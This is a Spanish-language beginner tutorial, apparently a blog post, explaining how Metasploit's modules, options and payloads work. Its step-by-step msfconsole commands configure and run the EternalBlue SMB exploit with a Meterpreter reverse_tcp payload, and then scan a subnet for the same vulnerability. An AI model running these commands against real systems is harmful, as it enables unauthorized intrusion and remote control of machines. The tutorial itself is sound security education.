---
title: "Metasploit: cómo usarlo sin perderse en la primera semana"
description: "Lo básico de Metasploit que necesitas entender antes de lanzar cualquier exploit: módulos, opciones, payloads y por qué msfconsole se cierra solo a veces."
slug: "metasploit-primeros-pasos"
category: "Herramientas"
tags: ["metasploit", "pentesting", "exploits", "msfconsole"]
date: "2026-04-02"
level: "Principiante"
---

## Por qué Metasploit confunde al principio

La primera vez que abrí msfconsole no sabía ni por dónde empezar. El prompt
`msf6 >` no dice nada, la lista de módulos son miles, y todos los tutoriales
dan por hecho que ya sabes qué es un "payload" y qué diferencia hay entre
un exploit y un auxiliar. Si estás en ese punto, esto es lo que me hubiera
ahorrado tiempo.

> Para entornos propios o de laboratorio con autorización. Usar Metasploit
> contra sistemas ajenos sin permiso es ilegal.

## La estructura que tienes que entender primero

Metasploit no es "una herramienta" — es un framework con módulos de distintos
tipos. Los que más vas a usar al principio:

```text
exploit/    → El módulo que aprovecha la vulnerabilidad
auxiliary/  → Escáneres, fuzzers, herramientas de reconocimiento
payload/    → Lo que se ejecuta en la máquina objetivo después de explotar
post/       → Acciones post-explotación (escalar privilegios, recopilar info)
```

La confusión más común: pensar que "el exploit" hace todo. Lo que hace el
exploit es abrir la puerta. Lo que haces después de abrirla lo define el
payload.

## El flujo básico de uso

```bash
# 1. Abrir msfconsole
msfconsole

# 2. Buscar un módulo
msf6 > search eternalblue
msf6 > search type:exploit name:smb

# 3. Seleccionar el módulo
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 4. Ver qué opciones necesita
msf6 exploit(ms17_010_eternalblue) > options

# 5. Configurar las opciones requeridas (las que pone "yes" en Required)
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.5

# 6. Seleccionar payload
msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp

# 7. Ejecutar
msf6 exploit(ms17_010_eternalblue) > run
```

## RHOSTS vs LHOST — la confusión más frecuente

```text
RHOSTS → Remote Host: la IP del objetivo (la máquina que atacas)
LHOST  → Local Host: tu IP (donde el payload se conecta de vuelta a ti)
```

Si estás en un laboratorio con máquinas virtuales en red NAT, el LHOST
tiene que ser tu IP en esa red interna, no `127.0.0.1` ni tu IP pública.
Error muy habitual: poner `localhost` en LHOST y no entender por qué el
payload no llega nunca.

## Payloads: staged vs stageless

Esto es lo que más cuesta entender al principio:

```text
windows/x64/meterpreter/reverse_tcp   → staged (tiene barra /)
windows/x64/meterpreter_reverse_tcp   → stageless (sin barra, guión bajo)
```

**Staged**: el exploit solo envía un pequeño stub que luego descarga el
payload completo. Más pequeño, pero requiere conexión activa al handler.

**Stageless**: el payload completo va de una. Más grande, pero más fiable
en redes con restricciones.

Para laboratorio, el staged funciona bien. Para entornos reales con
firewalls o restricciones de red, el stageless suele ser más fiable.

## Por qué msfconsole se cierra o se queda colgado

Pasa. Normalmente es porque:

- Tienes una sesión de Meterpreter activa y cierras la consola sin
  terminarla — usa `background` para dejarlo en segundo plano,
  no simplemente cierres.
- El payload tardó demasiado en conectar y el exploit agotó el tiempo
  de espera. Prueba subir el valor de `WfsDelay`.
- El handler no estaba corriendo cuando el payload intentó conectar.
  Asegúrate de lanzar `run -j` en el handler antes de ejecutar el exploit.

## El módulo auxiliar que más uso para reconocimiento

```bash
msf6 > use auxiliary/scanner/smb/smb_ms17_010
msf6 auxiliary(smb_ms17_010) > set RHOSTS 192.168.1.0/24
msf6 auxiliary(smb_ms17_010) > run
```

Los auxiliares de scanner son útiles antes de intentar explotar — te
confirman si el objetivo es vulnerable sin lanzar nada que pueda
desestabilizar el servicio.
